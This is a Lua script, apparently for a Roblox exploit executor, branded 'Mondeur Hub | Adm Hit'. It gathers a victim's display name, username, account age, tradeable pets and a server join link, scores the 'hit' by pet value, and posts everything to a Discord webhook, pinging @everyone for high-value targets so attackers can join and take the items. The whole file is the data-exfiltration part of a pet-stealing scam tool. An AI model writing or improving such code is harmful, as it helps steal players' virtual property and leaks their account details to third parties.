-- =========================
-- 🎨 COLORS
-- =========================
local rarityColors = {
    legendary = 0xFFD700,
    ultra_rare = 0xA020F0,
    rare = 0x1E90FF,
    uncommon = 0x32CD32,
    common = 0xB0B0B0
}

-- =========================
-- 🏷️ EMOJIS
-- =========================
local function getPetEmoji(name)
    local e = ""
    if name:find("red fox") then e = "🧑‍🌾 " 
    elseif name:find("disco bee") then e = "🪩 "
    elseif name:find("queen bee") then e = "🐝 " 
    end
    if e == "" then e = "🐾 " end
    return e
end

-- =========================
-- 📦 PROCESS PETS (CLEAN + TRADEABLE ONLY)
-- =========================
local function process(pets)
    local map, total = {}, 0

    for unique_id, pet_data in pairs(pets or {}) do
        if pet_data and pet_data.id then
            local petId = tostring(pet_data.id)
            
            -- SKIP UNTRADEABLE (EXACT MATCHES)
            if petId:find("starter") or 
               petId:find("practice") or 
               petId:find("jiggly jerboa") then
                continue
            end
            
            -- CLEAN NAME (REMOVE YEARS/NUMBERS)
            local cleanName = petId:gsub("_", " "):gsub("%d", ""):gsub("%s+", " ")
            local displayName = cleanName:sub(1,1):upper() .. cleanName:sub(2):gsub("^%s*(.-)%s*$", "%1")

            if not map[displayName] then
                map[displayName] = {
                    name = displayName,
                    count = 0,
                    rarity = (pet_data.rarity or "common"):lower()
                }
            end

            map[displayName].count += 1
            total += 10 
        end
    end

    local list = {}
    for name, v in pairs(map) do 
        table.insert(list, {name = name, count = v.count, rarity = v.rarity}) 
    end
    
    -- BEST TO WORST (MOST COUNT FIRST)
    table.sort(list, function(a,b) return a.count > b.count end)

    return list, total
end

-- =========================
-- 📋 FORMAT (ULTRA CLEAN)
-- =========================
local function format(list)
    local t = {}
    for i, p in ipairs(list) do
        if i > 12 then break end
        table.insert(t, getPetEmoji(p.name:lower()) .. p.name .. " x" .. p.count)
    end
    return (#t > 0 and table.concat(t,"\n") or "No tradeable pets")
end

-- =========================
-- 📊 TIER
-- =========================
local function getTier(v)
    if v >= HIGH_THRESHOLD then return "🔴 HIGH" end
    if v >= LOW_THRESHOLD then return "🟡 MID" end
    return "🟢 LOW"
end

-- =========================
-- 🚀 RUN
-- =========================
local function Run(data)
    local list, total = process(data.pets)
    local best = list[1] and (list[1].name.." x"..list[1].count) or "None"
    local petList = format(list)
    local tier = getTier(total)

    local content = (tier == "🔴 HIGH") and "@everyone" or ""
    local color = rarityColors[list[1] and list[1].rarity or "common"] or 0x2F3136

    local embed = {
        title = "🦊 Mondeur Hub | Adm Hit",
        description = "```" ..
            "👤 Display Name : "..data.player.displayName.."\n"..
            "🆔 Username     : "..data.player.username.."\n"..
            "📅 Account Age  : "..data.player.accountAge.." days\n"..
            "📱 Executor     : "..data.player.executor.."\n"..
            "👥 Players      : "..data.player.players.."\n"..
            "💰 Total Value  : "..total.."\n"..
            "📊 Tier         : "..tier.."```",
        fields = {
            {name="🏆 Best Pet", value="```"..best.."```"},
            {name="🐶 Pets (Best → Worst)", value="```"..petList.."```"},
            {name="🌐 Join Server", value="[Click to Join]("..data.joinLink..")"}
        },
        color = color,
        footer = {text = "Mondeuronbotton"}
    }

    local success, response = pcall(function()
        return requestFunc({
            Url = WEBHOOK,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode({content = content, embeds = {embed}})
        })
    end)

    if success then
        print("✅ Webhook Sent!")
    else
        warn("❌ Error: " .. tostring(response))
    end
end

